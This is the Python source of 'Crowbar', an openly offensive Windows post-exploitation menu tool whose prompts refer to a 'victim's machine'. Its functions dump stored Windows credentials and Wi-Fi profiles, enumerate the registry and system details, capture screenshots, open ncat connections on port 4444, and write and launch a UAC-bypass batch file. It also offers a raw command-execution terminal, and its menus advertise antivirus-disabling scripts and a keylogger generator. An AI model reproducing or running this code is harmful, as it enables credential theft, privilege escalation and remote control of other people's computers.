# Crowbar
# 4/14/2021
# Made by https://github.com/0x1CA3

import os
import ctypes
import datetime
import shutil
import pyautogui
import winreg
import socket
import platform
import psutil
import pyautogui
import requests
from datetime import datetime
from getmac import get_mac_address

ctypes.windll.kernel32.SetConsoleTitleW("[Crowbar] - Scripts: 11 | Utilities: 7")

def functionclear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

functionclear()
dt = datetime.now()

def checkonline():
    checkurl = "https://ipv4bot.whatismyipaddress.com/"
    respurl = requests.get(checkurl)
    if respurl.status_code == 200:
        print("\nhttps://ipv4bot.whatismyipaddress.com/ - Online!")
    else:
        print("\nhttps://ipv4bot.whatismyipaddress.com/ - Offline!")


def checkonline1():
    checkurl1 = "https://vpnapi.io/api/"
    respurl1 = requests.get(checkurl1)
    if respurl1.status_code == 200:
        print("\nhttps://vpnapi.io/api/ - Online!")
    else:
        print("\nhttps://vpnapi.io/api/ - Offline!")


# return for hub
def returnfunc():
    conhubin = input("Continue? y or n > ")
    if conhubin == "y":
        conhub()


# connect hub
def conhub():
    functionclear()
    ctypes.windll.kernel32.SetConsoleTitleW("[Connect Hub]")
    print(''' 
       ╔═╗┌─┐┌┐┌┌┐┌┌─┐┌─┐┌┬┐  ╦ ╦┬ ┬┌┐ 
       ║  │ │││││││├┤ │   │   ╠═╣│ │├┴┐
       ╚═╝└─┘┘└┘┘└┘└─┘└─┘ ┴   ╩ ╩└─┘└─┘
    --------------------------------------
    ======================================
    |        Connection Methods          |
    ======================================
    | 1. SSH                             |
    | 2. Netcat [Make sure its installed]|
    | 3.                                 |
    | 4.                                 |
    | 5.                                 |
    ======================================
    To select an option, use the command: !use (number of connection method)
    Use !help for commands.
    ''')

    connectinput = input("Connect Hub > ")
    if connectinput == "!help":
        print(''' 
        !help - Prints out help commands.
        !use (number of connection method) - Uses specified connection method.
        !back - Goes back to the Crowbar menu.
        ''')
        returnfunc()
    elif connectinput == "!back":
        os.system("py main.py")
    elif connectinput == "!use 1":
        conhubip = input("IP > ")
        os.system("ssh {}".format(conhubip))
        returnfunc()
    elif connectinput == "!use 2":
        ncatconhub = input("IP > ")
        os.system("ncat {} 4444".format(ncatconhub))
        returnfunc()
    else:
        print("Incorrect Command!")
        returnfunc()

def themonleave():
    themonlea = input("\nContinue? y or n > ")
    if themonlea == "y":
        themon()

def themon():
    functionclear()
    ctypes.windll.kernel32.SetConsoleTitleW("[iMonitor]")
    print(''' 
      ┬╔╦╗┌─┐┌┐┌┬┌┬┐┌─┐┬─┐
      │║║║│ │││││ │ │ │├┬┘
      ┴╩ ╩└─┘┘└┘┴ ┴ └─┘┴└─
   --------------------------
   ==========================
   |    root@iMonitor:~$    |
   ==========================
   |          Use           |
   |  !help for commands!!  |
   ==========================
Use !back to go to the Crowbar menu.
In oreder to select a command, do !use (task number). Example: !use 1
    ''')
    themoninput = input("iMonitor > ")
    if themoninput == "!help":
        print(''' 
        =================================================================
        |        Task Commands         |          Description           |
        =================================================================
        | 1. tasklist /svc	       | Lists active procceses.        |
        | 2. taskkill /PID /F          | Forcibly kill task.            |
        | 3. tasklist /V /S [PC NAME]  | Lists tasks on remote PC.      |
        | 4. at                        | Query scheduled tasks.         |
        | 5. schtasks                  | Query task you have accces to. |
        =================================================================
        ''')
        themonleave()
    elif themoninput == "!use 1":
        os.system("tasklist /svc")
        themonleave()
    elif themoninput == "!use 2":
        print('''Please make sure you have the PID number of the proccess
        you are trying to kill.
        ''')
        pidtaskinput = input("PID > ")
        os.system("taskkill /PID {} /F".format(pidtaskinput))
        themonleave()
    elif themoninput == "!use 3":
        print("Make sure you have the Computers name!")
        pcnamemon = input("Computers Name > ")
        os.system("tasklist /V /S {}".format(pcnamemon))
        themonleave()
    elif themoninput == "!use 4":
        os.system("at")
        themonleave()
    elif themoninput == "!use 5":
        os.system("schtasks")
        themonleave()
    elif themoninput == "!back":
        utilchamber()
    else:
        print("Incorrect Command!")
        imonwrong = input("Continue? y or n > ")
        if imonwrong == "y":
            themon()

# utilities

def utilchamber():
    functionclear()
    print(''' 
               ╦ ╦┌┬┐┬┬  ┬┌┬┐┬ ┬  ╔═╗┬ ┬┌─┐┌┬┐┌┐ ┌─┐┬─┐
               ║ ║ │ ││  │ │ └┬┘  ║  ├─┤├─┤│││├┴┐├┤ ├┬┘
               ╚═╝ ┴ ┴┴─┘┴ ┴  ┴   ╚═╝┴ ┴┴ ┴┴ ┴└─┘└─┘┴└─
  ------------------------------------------------------------------
  ==================================================================
  |         Utility           |            Description             |
  ==================================================================
  | 1. ConnectHub             | Hub that shows connection options. |
  | 2. iMonitor               | A utility for task monitoring.     |
  | 3.                        |                                    |
  | 4.                        |                                    |
  | 5.                        |                                    |
  | 6.                        |                                    |
  | 7.                        |                                    |
  | 8.                        |                                    |
  | 9.                        |                                    |
  | 10.                       |                                    |
  ==================================================================  
    To select an item, use the command: !use (Utility number)
    Example: !use 1
    Use !back to go back to the utility menu. Also use !help for commands.
    ''')
    utilcham = input("Utility Chamber > ")
    if utilcham == "!back":
        util()
    elif utilcham == "!help":
        print(''' 
        !help - Prints out help commands.
        !use (Utility number) - Uses the specified utility.
        !back - Goes back to the 'Utilites' Menu
        ''')
        utilmen = input("Continue? y or n > ")
        if utilmen == "y":
            utilchamber()
    elif utilcham == "!use 1":
        conhub()
    elif utilcham == "!use 2":
        themon()
    else:
        print("Incorrect Command!")
        chamutilwrong = input("Continue? y or n > ")
        if chamutilwrong == "y":
            utilchamber()

def util():
    ctypes.windll.kernel32.SetConsoleTitleW("[Utilities]")
    functionclear()
    print('''
                     ╦ ╦┌┬┐┬┬  ┬┌┬┐┬┌─┐┌─┐
                     ║ ║ │ ││  │ │ │├┤ └─┐
                     ╚═╝ ┴ ┴┴─┘┴ ┴ ┴└─┘└─┘
                    ------------------------
                  __|   Make sure you're   |__
                 |  connected to target!! :)  |
                 |____________________________|
==================================================================
|         Utility           |            Description             |
==================================================================
| 1. VM Detection           | Checks if host is a VM.            |
| 2. The Generator          | A multi-purpose tool.              |
| 3. Nmap Scan              | Scans host for ports.              |
| 4. Screenshot [Unstable]  | Captures hosts screen.             |                
| 5. AV Trigger             | Triggers AV with video.            |
| 6. Utility Chamber        | Enters the Utility Chamber.        |
==================================================================
''')
    print('''
    To select an item, use the command: !use (Utility number)
    Example: !use 1
    To go back to the main menu, use the command: !back
    ''')
    utilinput = input("Utilities > ")
    if utilinput == "!back":
         os.system("py main.py")
    else:
        if utilinput == "!use 1":
            print(''' 
            Make sure you compile this into an EXE before
            executing on the victims machine! This was 
            made by my friend.
            Credits to: https://github.com/dehoisted
            ''')
            userinput1 = input("Continue? y or n > ")
            if userinput1 == "y":
                util()
        else:
            if utilinput == "!use 2":
                util()
            else:
                if utilinput == "!use 3":
                    os.system("nmap localhost > Information/nmapresult.txt")
                    mmeninput = input("Continue? y or n >")
                    if mmeninput == "y":
                        util()
                else:
                    if utilinput == "!use 4":
                        sscapture = pyautogui.screenshot()
                        sscapture.save("Information/screencapture.png")
                        mmeninput1 = input("Continue? y or n >")
                        if mmeninput1 == "y":
                            util()
                    else:
                        if utilinput == "!use 5":
                            print('''
                            Are you sure that you want to run this file?
                            Make sure your target has golang installed by
                            using the command: go version
                            If the video gets deleted by the Anti-Virus
                            you can download it again with the link below.
                            https://cdn.discordapp.com/attachments/797665806019854346/828422416451108884/video.mov
                            ''')
                            avtriginput = input("Run this file? y or n > ")
                            if avtriginput == "y":   
                                os.system("go run Util/AvTrigger/main.go")
                            meniinput = input("Continue? y or n >")
                            if meniinput == "y":
                                util()
                        else:
                            if utilinput == "!use 6":
                                utilchamber()
                            else:
                                print("Incorrect Command!")
                                utilerror = input("Continue? y or n > ")
                                if utilerror == "y":
                                    util()



def reg():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)

	regkey = winreg.OpenKey(access_reg, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg1():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)

	regkey = winreg.OpenKey(access_reg, r"Environment")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg2():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)

	regkey = winreg.OpenKey(access_reg, r"Volatile Environment")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg3():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)

	regkey = winreg.OpenKey(access_reg, r"HARDWARE\DESCRIPTION\SYSTEM")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break


def reg4():
	access_reg = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)

	regkey = winreg.OpenKey(access_reg, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform")

	for n in range(20):
		try:
			x = winreg.EnumValue(regkey, n)
			print(x)
		except:
			break

# For scriptsmenu

machine1 = platform.machine()
version1 = platform.version()
platform1 = platform.platform()
uname1 = platform.uname()
system1 = platform.system()
process1 = platform.processor()
computername = socket.gethostname()
localipaddress = socket.gethostbyname(computername)
boottime = datetime.fromtimestamp(psutil.boot_time())

# Vault for scriptsmenu

# exit function for vault

def vaultenter():
    vaultleaveinput = input("\nContinue? y or n > ")
    if vaultleaveinput == "y":
        vaultmenu()

def vaultmenu():
    ctypes.windll.kernel32.SetConsoleTitleW("[Vault]")
    functionclear()
    print(''' 
                      ╦  ╦┌─┐┬ ┬┬ ┌┬┐
                      ╚╗╔╝├─┤│ ││  │ 
                       ╚╝ ┴ ┴└─┘┴─┘┴ 
                  -----------------------
                __|   Welcome to the    |__
               |          Vault!           |
               |___________________________|

    =======================================================
    |         Section          |       Description        |
    =======================================================
    | 1. Python Vault          | Vault of python scripts. |
    | 2. PowerShell Vault      | Vault of PS scripts.     |    ==================================================
    | 3. Batch Vault           | Vault of batch scripts.  | <- | Contains some fun features for messing around. |
    | 4. Bash Vault            | Vault of bash scripts.   |    ==================================================
    =======================================================
    ''')
    vaultuserinput = input("Vault > ")
    if vaultuserinput == "!back":
        scriptsmenu()
    elif vaultuserinput == "!use 1":
        print(''' 
        =======================================================
        |      Python Script       |       Description        |
        =======================================================
        | 1. GetUsers              | Prints all users on PC.  |
        | 2. ListCredentials       | Lists credentials.       |
        | 3. Dump Wi-Fi passwords  | Dumps Wi-Fi passwords.   |
        | 4. Get IPv4 Address      | Gets IPv4 Address.       |
        | 5.                       |                          |
        | 6.                       |                          |
        | 7.                       |                          |
        | 8.                       |                          |
        | 9.                       |                          |
        | 10.                      |                          |
        | 11.                      |                          |
        | 12.                      |                          |
        | 13.                      |                          |
        | 14.                      |                          |
        | 15.                      |                          |
        | 16.                      |                          |
        | 17.                      |                          |
        | 18.                      |                          |
        | 19.                      |                          |
        | 20.                      |                          |
        | 21.                      |                          |
        | 22.                      |                          |
        | 23.                      |                          |
        | 24.                      |                          |
        | 25.                      |                          |
        | 26                       |                          |
        | 27.                      |                          |
        | 28.                      |                          |
        =======================================================
        Use !back to go back to The Vault.
        ''')
        pyinput = input("Python Vault > ")
        if pyinput == "!use 1":
            os.system("net USER")
            vaultenter()
        elif pyinput == "!use 2":
            os.system("cmdkey /list")
            vaultenter()
        elif pyinput == "!use 3":
            os.system("py Scripts/Vault/Python/getwifipwd.py")
        elif pyinput == "!back":
            vaultmenu()
        elif pyinput == "!use 4":
            os.system("py Scripts/Vault/Python/ipv4.py")
    elif vaultuserinput == "!use 3":
        print('''
            If you are solely here for trolling, have fun!     
        =======================================================
        |      Batch Script        |       Description        |
        =======================================================
        | 1. UAC Bypass            | Bypasses UAC for exe's.  |
        | 2. Message Box           | Pops out a message box.  |
        | 3.                       |                          |
        | 4.                       |                          |
        | 5.                       |                          |
        | 6.                       |                          |
        | 7.                       |                          |
        | 8.                       |                          |
        | 9.                       |                          |
        | 10.                      |                          |
        | 11.                      |                          |
        =======================================================        
        Use !back to go back to the vault page.
        ''')
        batchvault = input("Batch Vault > ")
        if batchvault == "!use 1":
            print("lol")
            uacbatques = input("Name of app > ")
            uacbypass = open("Scripts/Vault/Batch/uacbypass.bat","w")
            uacbypass.write('''set __COMPAT_LAYER=RunAsInvoker 
            start {}'''.format(uacbatques))
            uacexeques = input("Execute file? > ")
            if uacexeques == "y":
                os.system("start Scripts/Vault/Batch/uacbypass.bat")
            elif uacexeques == "n":
                vaultmenu()
    elif vaultuserinput == "!use 2":
        print(''' 
                                 ╔═╗┌─┐  ╦  ╦┌─┐┬ ┬┬ ┌┬┐
                                 ╠═╝└─┐  ╚╗╔╝├─┤│ ││  │ 
                                 ╩  └─┘   ╚╝ ┴ ┴└─┘┴─┘┴ 
                  -------------------------------------------------------
        =============================================================================
        |                           [Powershell Vault]                              | 
        =============================================================================
        | 1.                                                                        | 
        | 2.                                                                        | 
        | 3.                                                                        | 
        | 4.                                                                        | 
        | 5.                                                                        | 
        =============================================================================
        ''')
        psvaultinput = input("!use 1")
    else:
        print("Incorrect Command!")
        kkwrong = input("Continue? y or n > ")
        if kkwrong == "y":
            vaultmenu()        

# scriptsmenu

# wifidumper

def wifidumper():
    print(''' 
    ╦ ╦┬   ╔═╗┬  ╔╦╗┬ ┬┌┬┐┌─┐┌─┐┬─┐
    ║║║│───╠╣ │   ║║│ ││││├─┘├┤ ├┬┘
    ╚╩╝┴   ╚  ┴  ═╩╝└─┘┴ ┴┴  └─┘┴└─
    ''')
    os.system("Netsh WLAN show profiles > Information/WiFi_Info.txt")
    print('''Dump successful! 
    To go back to the main Crowbar menu, use !menu
    To go back to the Scripts menu, use !scripts
    ''')
    userinput = input("Crowbar > ")
    if userinput == "!menu":
        os.system("py main.py")
    else:
        if userinput == "!scripts":
            scriptsmenu()
        else:
            print("Incorrect Command!")
            userinput1 = input("Continue? y or n > ")
            if userinput1 == "y":
                wifidumper()


def scriptsmenu():
    ctypes.windll.kernel32.SetConsoleTitleW("[Scripts]")
    functionclear()
    print(''' 
                    ╔═╗┌─┐┬─┐┬┌─┐┌┬┐┌─┐
                    ╚═╗│  ├┬┘│├─┘ │ └─┐
                    ╚═╝└─┘┴└─┴┴   ┴ └─┘
                  -----------------------
                __|   Make sure your    |__
               |    target has python!!!   |
               |___________________________|

    =======================================================
    |          Script          |       Description        |
    =======================================================
    | 1. Wi-Fi/Hostpot Grabber | Grabs the SSID and more. |
    | 2. Dump System info      | Dumps basic system info. |
    | 3. Extract Chrome Pwd DB | Gets Chrome password DB. |
    | 4. Get Registry Info     | Dumps Registry Info.     |
    | 5. AV-KILL               | Attempts to disable AV.  |
    | 6. The Vault             | Goes to the Vault.       |
    =======================================================
    ''')

    print('''
    To select an item, use the command: !use (Script number)
    Example: !use 1

    To go back to the main menu, use the command: !back
    ''')

    userinputscripts = input("Scripts > ")
    if userinputscripts == "!back":
        os.system("py main.py")
    else:
        if userinputscripts == "!use 1":
            wifidumper()
        else:
            if userinputscripts == "!use 2":
                ctypes.windll.kernel32.SetConsoleTitleW("[Scripts] - Basic System Information")
                print(f''' 
                 ╔╗ ┌─┐┌─┐┬┌─┐  ╔═╗┬ ┬┌─┐┌┬┐┌─┐┌┬┐  ╦┌┐┌┌─┐┌─┐
                 ╠╩╗├─┤└─┐││    ╚═╗└┬┘└─┐ │ ├┤ │││  ║│││├┤ │ │
                 ╚═╝┴ ┴└─┘┴└─┘  ╚═╝ ┴ └─┘ ┴ └─┘┴ ┴  ╩┘└┘└  └─┘
            -------------------------------------------------------
            =======================================================
            |                     Information                     |
            =======================================================
            | Machine: {machine1}                                      |
            | Version: {version1}                                 |
            | Platform: {platform1}                 |
            | System: {system1}                                     |
            | Computer Name: {computername}                      |
            | Local IP: {localipaddress}                              |
            | Last Boot Time: {boottime}          |
            =======================================================
            ''')
                userinputscripts = input("Continue? y or n > ")
                if userinputscripts == "y":
                    scriptsmenu()
            else:
                if userinputscripts == "!use 3":
                    print("working on it l0l")
                else:
                    if userinputscripts == "!use 4":
                        ctypes.windll.kernel32.SetConsoleTitleW("[Scripts] - Registry Menu")
                        print(f''' 
                               ╦═╗┌─┐┌─┐┬┌─┐┌┬┐┬─┐┬ ┬  ╔╦╗┌─┐┌┐┌┬ ┬
                               ╠╦╝├┤ │ ┬│└─┐ │ ├┬┘└┬┘  ║║║├┤ ││││ │
                               ╩╚═└─┘└─┘┴└─┘ ┴ ┴└─ ┴   ╩ ╩└─┘┘└┘└─┘
                      -------------------------------------------------------
            =============================================================================
            |                              Registry Menu                                | 
            =============================================================================
            | 1. SOFTWARE\Microsoft\Windows NT\CurrentVersion                           | 
            | 2. Environment                                                            | 
            | 3. Volatile Environment                                                   | 
            | 4. HARDWARE\DESCRIPTION\SYSTEM                                            | 
            | 5. SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform| 
            =============================================================================
                                     Use !reghelp for commands
                        ''')
                        reginput = input("Registry > ")
                        if reginput == "!scan 1":
                            reg()
                            meninput = input("Continue? y or n > ")
                            if meninput == "y":
                                scriptsmenu()
                        else:
                            if reginput == "!scan 2":
                                reg1()
                                meninput1 = input("Continue? y or n > ")
                                if meninput1 == "y":
                                    scriptsmenu()
                            else:
                                if reginput == "!scan 3":
                                    reg2()
                                    meninput2 = input("Continue? y or n > ")
                                    if meninput2 == "y":
                                        scriptsmenu()
                                else:
                                    if reginput == "!scan 4":
                                        reg3()
                                        meninput3 = input("Continue? y or n > ")
                                        if meninput3 == "y":
                                            scriptsmenu()
                                    else:
                                        if reginput == "!scan 5":
                                            reg4()
                                            meninput4 = input("Continue? y or n > ")
                                            if meninput4 == "y":
                                                scriptsmenu()
                                        else:
                                            if reginput == "!reghelp":
                                                print(''' 
                                                !reghelp - Prints out help commands.
                                                !scan (number) - Scans the desired directory from the menu above. Exa
                                                !exit
                                                ''')
                                                meninput5 = input("Continue? y or n > ")
                                                if meninput5 == "y":
                                                    scriptsmenu()
                                            else:
                                                if reginput == "!exit":
                                                    scriptsmenu()
                                                else:
                                                    print("Incorrect Command!")
                                                    wronginputscriptsss = input("Continue? y or n > ")
                                                    if wronginputscriptsss == "y":
                                                        scriptsmenu()
                    else:
                        if userinputscripts == "!use 5":
                            print(''' 
                            This script will be generated, but will not be executed.
                            You will have to execute this script yourself at your own ris
                            In order to execute the script on the victims machine, just
                            type the filename and hit enter. Example: avkill.bat
                            ''')
                            continueinput12 = input("Continue? y or n > ")
                            if continueinput12 == "y":
                                scriptsmenu()
                        else:
                            if userinputscripts == "!use 6":
                                vaultmenu()
                            else:
                                print("Incorrect Command!")
                                wronginputscripts = input("Continue? y or n > ")
                                if wronginputscripts == "y":
                                    scriptsmenu()

# generator directory

def generatordir():
    functionclear()
    print(''' 
    ╔═╗┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  ╔╦╗┬┬─┐┌─┐┌─┐┌┬┐┌─┐┬─┐┬ ┬
    ║ ╦├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘   ║║│├┬┘├┤ │   │ │ │├┬┘└┬┘
    ╚═╝└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  ═╩╝┴┴└─└─┘└─┘ ┴ └─┘┴└─ ┴ 
    ------------------------------------------------------
    Use !genhelp for commands.
    ''')

    userinput = input("Generator > ")
    if userinput == "!genhelp":
        print(''' 
        !genhelp - Prints out help commands.
        !list - List all the files created by the generator in the directory.    
        !read (filename) - Read the contents of a file. Example: !read keylogger.py
        !back - Goes back to the main Crowbar menu.
        ''')
        meninput = input("Continue? y or n > ")
        if meninput == "y":
            generatordir()
    else:
        if userinput == "!list":
            os.system("dir")
            meninput1 = input("Continue? y or n > ")
            if meninput1 == "y":
                generatordir()
        else:
            if userinput == "!read":
                print("Make sure to put the name of the file you want to read from including the extension!")
                fileinput = input("Generator > ")
                os.system('cd Generator & type {}'.format(fileinput))
                meninput1 = input("\n\nContinue? y or n > ")
                if meninput1 == "y":
                    generatordir()
            else:
                if userinput == "!back":
                    os.system("py main.py")
                meninput312 = input("Continue? y or n >")
                if meninput312 == "y":
                    generatordir()
                else:
                    print("Incorrect Command!")
                    wronginput = input("Continue? y or n >")
                    if wronginput == "y":
                        os.system("py main.py")


# iCommand

def icommand():
    ctypes.windll.kernel32.SetConsoleTitleW("[iCommand]")
    functionclear()
    print(''' 
     ┬╔═╗┌─┐┌┬┐┌┬┐┌─┐┌┐┌┌┬┐
     │║  │ │││││││├─┤│││ ││
     ┴╚═╝└─┘┴ ┴┴ ┴┴ ┴┘└┘─┴┘
   __________________________
   ==========================
   |    root@iCommand:~$    |
   ==========================
   |          Use           |
   |  !help for commands!!  |
   ==========================
   ''')
    icinput = input("iCommand > ")
    if icinput == "!help":
        print(''' 
        !help - Prints out help commands.
        !help commands - Prints out all available commands to execute on the victims machine.
        !execute - Lets you execute a command on the victim machine.
        !exit - Goes back to the Utility Menu.
        ''')
        meneinput = input("Continue? y or n > ")
        if meneinput == "y":
            icommand()
    elif icinput == "!help commands":
        print('''
   ========================== 
   |     Basic Commands     |
   ==========================
   | bitsadmin	            |
   | call                   |
   | cd                     |
   | chcp                   |
   | chdir	            |
   | choice                 |
   | clip                   |
   | cls                    |
   | cmd                    |
   | color	            |
   | command                |
   | date                   |
   | dir                    |
   | echo                   |
   | exit                   |
   | find                   |
   | findstr                |
   | help                   |
   | lpq                    |
   | lpr                    |
   | md                     |
   | mkdir                  |
   | more                   |
   | path                   |
   | pause                  |
   | print                  |
   | prompt                 |
   | rd                     |
   | rmdir                  |
   | runas                  |
   | schtasks               |
   | time                   |
   | timeout                |
   | title                  |
   | tree                   |
   | type                   |
   | tzutil                 |
   | ver                    |
   ==========================                                
        
        
   
   ========================== 
   |     File Commands      |
   ==========================     
   | copy                   |
   | del                    |
   | erase                  |
   | extrac32               |
   | fc                     |
   | for                    |
   | forfiles               |
   | ftype                  |
   | goto                   |
   | if                     |
   | makecab                |
   | mklink                 |
   | move                   |
   | openfiles              |
   | recover                |
   | ren                    |
   | rename                 |
   | replace                |
   | robocopy               |
   | setlocal               |
   | sxstrace               |
   | takeown                |
   | where                  |
   | xcopy                  |
   ==========================
  
  
   
   ========================== 
   |    System Commands     |
   ==========================     
   | at                     |
   | auditpol               |
   | backup                 |
   | bcdboot                |
   | bcdedit                |
   | bdehdcfg               |
   | bootsect               |
   | cacls                  |
   | chkdsk                 |
   | chkntfs                |
   | convert                |
   | diskpart               |
   | diskperf               |
   | diskraid               |
   | dism                   |
   | dispdiag               |
   | driverquery            |
   | fltmc                  |
   | fondue                 |
   | fsutil                 |
   | hwrcomp                |
   | hwrreg                 |
   | icacls                 |
   | ktmutil                |
   | label                  |
   | lh	                    |
   | mode                   |
   | mofcomp                |
   | mountvol               |
   | msiexec                |
   | netcfg                 |  
   | qprocess               |     
   | query                  |     
   | reg                    |     
   | regini                 |     
   | systeminfo             |     
   | vol                    |     
   | wbadmin                |     
   | whoami                 |     
   ==========================
   
   
   
   ========================== 
   |    Network Commands    |
   ==========================                          
   | arp                    |       
   | certreq                |     
   | certutil               |     
   | change                 |     
   | checknetisolation	    |     
   | chglogon               |     
   | chgport                |     
   | chgusr                 |     
   | cmstp                  |     
   | djoin                  |     
   | finger                 |    
   | ftp                    |    
   | getmac                 |    
   | gpresult               |    
   | gpupdate               |
   | hostname               |    
   | interlnk               |    
   | intersvr               |    
   | ipconfig               |    
   | irftp                  |    
   | iscsicli               |    
   | klist                  |    
   | ksetup                 |    
   | mrinfo                 |    
   | nbtstat                |    
   | nslookup               |    
   | pathping               |    
   | ping                   |    
   | route                  |    
   | taskkill               |    
   ==========================
   ''')
        meneinput1 = input("Continue? y or n > ")
        if meneinput1 == "y":
            icommand()
    elif icinput == "!execute":
        functionclear()
        icommandterm()
    elif icinput == "!exit":
        os.system("py main.py") 
    else:
        print("Incorrect Command!")
        wronginput111 = input("Continue? y or n > ")
        if wronginput111 == "y":
            icommand() 

# iCommand terminal

def icommandterm():
    ctypes.windll.kernel32.SetConsoleTitleW("root@iCommand:~$")
    icomterm = input("\nroot@iCommand:~$ ")
    os.system("{}".format(icomterm))
    icominput = input("\nContinue? y or n > ")
    if icominput == "y":
        icommandterm()
    elif icominput == "n":
        icommand()
    else:
        print("Incorrect Command!")
        icomwrong = input("\nContinue? y or n > ")
        if icomwrong == "y":
            os.system("py main.py")



print('\033[32m' + f'''
MM'""""'YMM                              dP                         
M' .mmm. `M                              88                         
M  MMMMMooM 88d888b. .d8888b. dP  dP  dP 88d888b. .d8888b. 88d888b. 
M  MMMMMMMM 88'  `88 88'  `88 88  88  88 88'  `88 88'  `88 88'  `88 
M. `MMM' .M 88       88.  .88 88.88b.88' 88.  .88 88.  .88 88       
MM.     .dM dP       `88888P' 8888P Y8P  88Y8888' `88888P8 dP       
MMMMMMMMMMM                                                         
                           [Crowbar]
[-----------------------------------------------------------------]
[ Version: 1.3                                                    ]
[ Date: {dt}                                ]
[ Total Scripts: 11                                               ]
[ Total Utilities: 7                                              ] 
[ Made by: https://github.com/0x1CA3                              ]
[ Use !help for commands!                                         ]
[-----------------------------------------------------------------]

                       [Online Services]
[-----------------------------------------------------------------]
[ Total Online Sevices: 2                                         ]
[ https://ipv4bot.whatismyipaddress.com/                          ]
[ https://vpnapi.io/api/                                          ]
[ Use !online to check if the services are online!                ]
[-----------------------------------------------------------------]
''')

# 11
# 7

userinput = input("Crowbar > ")
if userinput == "!help":
    print(''' 
    !help - Prints out commands.
    !dir util - Goes into the 'Util' directory.
    !dir scripts - Goes into the 'Scripts' directory.
    !dir generator - Goes into the 'Generator' directory.
    !exe iCommand - Loads the 'iCommand' tool for executing OS commands.
    ''')
    userinput1 = input("Continue? y or n > ")
    if userinput1 == "y":
        os.system("py main.py")
elif userinput == "!dir util":
    util()
elif userinput == "!dir scripts":
    scriptsmenu()
elif userinput == "!dir generator":
    generatordir()
elif userinput == "!exe iCommand":
    icommand()
elif userinput == "!online":
    checkonline()
    checkonline1()
    oninput = input("\nContinue? y or n >")
    if oninput == "y":
        os.system("py main.py")
else:
    print("Incorrect Command!")
    wronginput = input("Continue? y or n >")
    if wronginput == "y":
        os.system("py main.py")
# adding more hhhhhhhhhhhhhhhhhhhhhhhh
